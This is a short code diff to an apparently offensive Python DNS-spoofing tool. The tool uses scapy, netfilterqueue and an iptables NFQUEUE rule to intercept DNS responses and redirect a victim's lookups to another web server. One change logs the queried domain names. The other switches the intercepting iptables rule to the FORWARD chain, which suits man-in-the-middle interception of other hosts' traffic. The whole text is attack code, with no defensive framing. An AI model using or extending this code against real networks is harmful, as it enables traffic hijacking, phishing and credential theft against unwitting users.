@@ -6,7 +6,7 @@ import os
 def dns_response(pkt, interface, redirected_webserver, victim_webserver = None):
     packet = IP(pkt.get_payload())
     if packet.haslayer(DNS):
-        print("Got packet", hex(packet[DNS].id))
+        print("Got packet", hex(packet[DNS].id), packet[DNSQR].qname.decode())
     if packet.haslayer(DNSRR):
         print("Got DNS response packet")
         qname = packet[DNSQR].qname
@@ -31,7 +31,7 @@ def dns_response(pkt, interface, redirected_webserver, victim_webserver = None):
 def dns_attack(interface, redirected_webserver, victim_webserver = None):
 
     # Setup iptables
-    os.system("iptables -I INPUT -p udp --sport 53 -j NFQUEUE --queue-num 0")
+    os.system("iptables -I FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0")
 
     queue = netfilterqueue.NetfilterQueue()
 
